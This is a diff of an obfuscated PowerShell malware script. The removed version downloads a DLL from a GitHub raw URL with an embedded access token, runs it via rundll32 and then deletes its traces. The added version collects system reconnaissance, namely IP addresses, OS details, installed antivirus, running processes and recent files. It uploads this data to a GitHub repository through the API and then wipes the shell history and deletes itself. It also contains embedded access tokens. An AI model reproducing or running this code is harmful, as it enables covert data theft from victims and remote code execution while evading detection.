@@ -1,50 +1,66 @@
-$qpowijcosdvoshbegrg = "dfhfgthdlfvkndlfkng";
-$pvnoizbudefioseubgsdvxcfg = New-Object System.Threading.Mutex($false, $qpowijcosdvoshbegrg);
-if($pvnoizbudefioseubgsdvxcfg.WaitOne(0)){
-$szxsdlvohjsidbvjlznkvldsfrg="<MP{(*(*&^^!QAZ54rdfkli8475980sdfgporiIGDiuo94385()*&^^%gi++~`iusdfgdsf'ds'l[dsfhuTI*&DSFGOI))}";
-$asdcvkzjhxvcjsdgdfbvxdfgd="dfgjkhionjdkkHIUSPIUY(*49945iop4j3tiojrj;lnfdln;dsgnbn;kj fd;kdnf;bkn;dflnb;lfnb;lndg;lkbn;lknbkjvcnkbnfgnb;kngf;l";
-$VNb374fyefh9sdhf329d8hfwe8h982h3d823="ht"+"tp"+"s://"+"ra"+"w.g"+"i"+"t"+"h"+"ub"+"us"+"e"+"rco"+"n"+"te"+"nt.c";
-$DSFrwe534ewrtewrtrt="dfgjkhionjdkkHIUSPIUY(*49945iop4j3tiojrj;lnfdln;dsgnbn;kjfd;kdnfbkn;dflknb;lfnb;lndg;lkbn;lknbkjvcnkbnfgnbihsoidh";
-$VNb374fyefh9sdhf329d8hfwe8h982h3d823+="o"+"m/"+"ja"+"mej"+"ac"+"ky"+"5"+"5/r"+"r"+"raa"+"at"+"tt_w"+"eoi"+"hv"+"eg/"+"ma"+"in/";
-$asdcvkzjhxvcjsdgdfbvxdfgd="dfgjkhionjdkkHIUSPIUY(*49945iop4j3tiojrj;lnfdln;dsgnbn;kj fd;kdnf;bkn;dflnb;lfnb;lndg;lkbn;lknbkjvcnkbnfgnb;kngf;l";
-$DSFrwe534ewrtewrtrt="dfgjkhionjdkkHIUSPIUY(*49945iop4j3tiojrj;lnfdln;dsgnbn;kjfd;kdnfbkn;dflknb;lfnb;lndg;lkbn;lknbkjvcnkbnfgnbihsoidh";
-$f39r8y98yf9h9fHGJUHVUYgf873r="gh"+"p_EQ"+"lNO4"+"0FN"+"06C"+"DKJ"+"ugb"+"fzl"+"bN7"+"d9p"+"bUE"+"1ud"+"Aj"+"Q";
-$groihsf = "C:\Users\Public\Downloads\monranter.dll";
-$sedfwkmcmzxkjbvfg=@{Authorization="token $f39r8y98yf9h9fHGJUHVUYgf873r";frjc="hdjgERErit783tiu";Accept="application/vnd.github.v3.raw"};
-$fhtreOO = "C:\Users\Public\Downloads\kato.db";
-$ohgvergt = Join-Path ($env:AppData) "\Microsoft\Windows\Templates\ip.ini";
-$dvapsojfsedflszlxdvnkdfg=$VNb374fyefh9sdhf329d8hfwe8h982h3d823+"qpionrrrse.rtf";
-if ([System.IO.File]::Exists($groihsf)) {remove-item $groihsf -Force -Recurse -ErrorAction SilentlyContinue};
-if ([System.IO.File]::Exists($fhtreOO)) {remove-item $fhtreOO -Force -Recurse -ErrorAction SilentlyContinue};
-if ([System.IO.File]::Exists($ohgvergt)) {remove-item $ohgvergt -Force -Recurse -ErrorAction SilentlyContinue};
-Invoke-WebRequest -Uri $dvapsojfsedflszlxdvnkdfg -Headers $sedfwkmcmzxkjbvfg -UseBasicParsing -OutFile $groihsf;
-$ppoiiyihfj="dfgjkhionjdkkHIUSPIUY(*49945iop4j3tiojrjfd;kdnf;bkn;dflknb;lfnb;lndg;lkbn;lknbkjvcnkbnfgnb;kngf;lknb;klfndbgb;klj;klfjhkf;ljhk;fdljhk;fljhklgjhktohjgkkhltjhkjogjklfjglh;jflkhj";
-$fgerihUHwefgorehwo=$VNb374fyefh9sdhf329d8hfwe8h982h3d823+"kato.db";
-Start-Sleep -Seconds 2;
-Invoke-WebRequest -Uri $fgerihUHwefgorehwo -Headers $sedfwkmcmzxkjbvfg -UseBasicParsing -OutFile $fhtreOO;
-$dkvhigr=$VNb374fyefh9sdhf329d8hfwe8h982h3d823+"ip.ini";
-$fdinbuergvfr="dfgjkhionjdkkHIUSPIUY(*49945iop4j3tiojrj;lnfdln;dsgnbn;kjfd;kdnfbkn;dflknb;lfnb;lndg;lkbn;lknbkjvcnkbnfgnbihsoidh";
-#Invoke-WebRequest -Uri $dkvhigr -Headers $sedfwkmcmzxkjbvfg -UseBasicParsing -OutFile $ohgvergt;
-$fdinbuergvfr="dfgjkhionjdkkHIUSPIUY(*49945iop4j3tiojrj;lnfdln;dsgnbn;kjfd;kdnfbkn;dflknb;lfnb;lndg;lkbn;lknbkjvcnkbnfgnbihsoidh";
-Start-Sleep -Seconds 5;
-if ([System.IO.File]::Exists($groihsf)){
-	$jvnsdroger="dfgjkhionjdkkHIUSPIUY(*49945iop4j3tiojrj;lnfdln;dsgnbn;kjfd;kdnfbkn;dflknb;lfnb;lndg;lkbn;lknbkjvcnkbnfgnbihsoidh";
-	if ([System.IO.File]::Exists($fhtreOO)){
-		$mvoisgerg="dfgjkhionjdkkHIUSPIUY(*49945iop4j3tiojrj;lnfdln;dsgnbn;kjfd;kdnfbkn;dflknb;lfnb;lndg;lkbn;lknbkjvcnkbnfgnbihsoidh";
-		rundll32.exe $groihsf,out;
-	}
+$sdjkvwe4KIVUIWr= "asdfdgtrBGONJOUFOAISFAwefsdjkghjkldshgjkldhsgjkdshgjkhkjfgl;kjkldsgjl;kdjgkeiorgjioejrgjdlksjglkjdsgkdsgkh";
+$BBBBSfeIGwfbzxvde = Join-Path $env:AppData "Microsoft";
+$pqwojfncbf= "asdfdgtrBGONJOUFOAISFAwefsdjkghjkldshgjkldhsgjkdshgjkhkjfgl;kjkldsgjl;kdjgkeiorgjioejrgjdlksjglkjdsgkdsgkh";
+$dhfjkg= "sdjkghjkldshgjkldhsgjkdshgjkhkjfgl;kjkldsgjl;kdjgkeiorgjioejrgjdlksjglkjdsgkdsgkh";
+$GGGLKNWSVs = "gh"+"p_r"+"7wLdbb"+"5F"+"1xW"+"VFgq"+"Hygy"+"iGM"+"1W"+"at"+"sm9"+"4DK"+"A"+"si"
+
+$derrhfjkg= "sdjkdgdgdgghjkldshgjkldhsgjkdshgjkhkjfgl;kjkldsgjl;kdjgkeiorgjioejrgjdlksjglkjdsgkdsgkh";
+$bvfdbdfgfhthder = (Get-WmiObject Win32_NetworkAdapterConfiguration | Where-Object { $_.IPAddress -ne $null }).IPAddress[0];
+$ldfjgvodsrtgry = (Resolve-DnsName myip.opendns.com -Server resolver1.opendns.com).IP4Address;
+$VVVSOuhfge = Get-Date -Format "MMdd_HHmm"
+$MMMOjeigfseg = "$ldfjgvodsrtgry-$bvfdbdfgfhthder-$VVVSOuhfge-info.txt"
+
+$UUUISUbvieifvg = Join-Path $BBBBSfeIGwfbzxvde $MMMOjeigfseg;
+if ([System.IO.File]::Exists($UUUISUbvieifvg)) {remove-item $UUUISUbvieifvg -Force -Recurse -ErrorAction SilentlyContinue;}
+$sdlvgnodrhgwerf= "pnobpsdpmsskjdbvasdegf;kjkldsgjl;kdjgkeiorgjioejrgjdlksjglkjdsgkdsgkh";
+(Get-CimInstance Win32_OperatingSystem).LastBootUpTime | Out-File -FilePath $UUUISUbvieifvg;
+$dflbnosodfihtrg= "asdfdgtrBGONJOUFOAISFAwefsdjkghjkldshgjkldhsgjkdshgjkhkjfgl;kjkldsgjl;kdjgkeiorgjioejrgjdlksjglkjdsgkdsgkh";
+(Get-CimInstance Win32_OperatingSystem | Select-Object Caption, Version, BuildNumber, OSArchitecture) | Out-File -FilePath $UUUISUbvieifvg -Append;
+$OOBNrdtr= "asdfdgtrBGONJOUFOAISFAwefsdjkghjkldshgjkldhsgjkdshgjkhkjfgl;kjkldsgjl;kdjgkeiorgjioejrgjdlksjglkjdsgkdsgkh";
+Get-WmiObject -Class Win32_ComputerSystem | Out-File -FilePath $UUUISUbvieifvg -Append;
+$sdnfvoisodgerg= "sdvsongienflavocdnvosdeg;kjkldsgjl;kdjgkeiorgjioejrgjdlksjglkjdsgkdsgkh";
+if ((Get-WmiObject -Class Win32_ComputerSystem).PCSystemType -eq 2) {
+    Write-Output "Note" | Out-File -FilePath $UUUISUbvieifvg -Append;
+} else {
+    Write-Output "Desk" | Out-File -FilePath $UUUISUbvieifvg -Append;
 }
-$oqwiejqpOJVNde="dfgjkhionjdkkHIUSPIUY(*49945iop4j3tiojrj;lnfdln;dsgnbn;kjfd;kdnfbkn;dflknb;lfnb;lndg;lkbn;lknbkjvcnkbnfgnbihsoidh";
-Start-Sleep -Seconds 2;
-$sldhvvbsdg = "sdlhvaf0a8r42ni03dm9023jrd0223)O*UY(G@3oij09y)(*saG08h08hr3nwfoiwshed0giew4t523523tgsddfvljasf";
-Remove-Item -Path $fhtreOO;
-$ergdpvjdfngpsorg = "sdlhvaf0a8rsdgvlxkdjvpdfkm b;lmcfphgd)_(&englkmsdpijbgvfh08hr3nwfoiwshed0giew4t523523tgsddfvljasf";
-Start-Sleep -Seconds 2;
-Remove-Item -Path $groihsf;
-Start-Sleep -Seconds 2;
-$oqwiejqpOJVNde="dfgjkhionjdkkHIUSPIUY(*49945iop4j3tiojrj;lnfdln;dsgnbn;kjfd;kdnfbkn;dflknb;lfnb;lndg;lkbn;lknbkjvcnkbnfgnbihsoidh";
-$sdvpodihfbgdrg = "sdlhvaf0a8r42ni03dm9023jrdsdgvapma[ppjgsdfoi9s4s09fhHdiew4t523523tgsddfvljasf";
+$sdfokpqwjocvfrg= "nkspdnibvpsndpfe;kjkldsgjl;kdjgkeiorgjioejrgjdlksjglkjdsgkdsgkh";
+(Get-WmiObject Win32_OperatingSystem).InstallDate | Out-File -FilePath $UUUISUbvieifvg -Append;
+$sdvlosnopdfibdefr= "wefwefpowjpovpdmfvpsd;kjkldsgjl;kdjgkeiorgjioejrgjdlksjglkjdsgkdsgkh";
+(Get-WmiObject -Namespace root\SecurityCenter2 -Class AntiVirusProduct).displayName | Out-File -FilePath $UUUISUbvieifvg -Append;
+
+$NNMTWdiwfb = Get-Process
+$NNMTWdiwfb | Out-File -FilePath $UUUISUbvieifvg -Append
+
+$rc = Get-ChildItem ([Environment]::GetFolderPath('Recent'))
+$rc | Out-File -FilePath $UUUISUbvieifvg -Append
+
+$outputFile = Split-Path $UUUISUbvieifvg -leaf
+$drtethfjkg= "1243435sdjkghjkldshgjkldhsgjkdshgjkhkjfgl;kjklddsgdgdsgesgjl;kdjgkeiorgjioejrgjdlksjglkjdsgkdsgkh";
+$QQQMMNVUghwergtrg = "htt"+"ps"+":/"+"/a" + "pi.g" + "ith" + "ub.com/re" 
+
+$trtdhfjkg= "sdjkghjkldshgjkldhsgjkdshgjkhkjffght234243gl;kjkldsgjl;kdjgkeiorgjioejrgjdlksjglkjdsgkdsgkh";
+$QQQMMNVUghwergtrg += "pos/Dbaras6600/ioernuty/contents/report/" + $MMMOjeigfseg
+$blonsdopnvgrg = Get-Content -Path $UUUISUbvieifvg  -Encoding Byte
+$fileContentBase64 = [Convert]::ToBase64String($blonsdopnvgrg)
+
+$PJOEDNgr = @{
+    message = "Upload file $MMMOjeigfseg"
+    content = $fileContentBase64
+    branch = "main"
+}
+
+$headers = New-Object "System.Collections.Generic.Dictionary[[String],[String]]"
+$headers.Add("Authorization", "token $GGGLKNWSVs")
+$headers.Add("Content-Type", 'application/json')
+
+
+$diauyadsf = "djdaidjaid"
+$diaahah = "1818adjfiasdjif"
+$djaijd = 190298312838123
+
+Invoke-RestMethod -Uri $QQQMMNVUghwergtrg -Method Put -Body ($PJOEDNgr | ConvertTo-Json) -Headers $headers;
 $his = $env:appdata + "\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt";
-if ([System.IO.File]::Exists($his)) {remove-item $his -Force -Recurse -ErrorAction SilentlyContinue};
+Remove-Item -Path $his -Force;
+Remove-Item -Path $UUUISUbvieifvg;
 Remove-Item -Path $MyInvocation.MyCommand.Path -Force;
-};
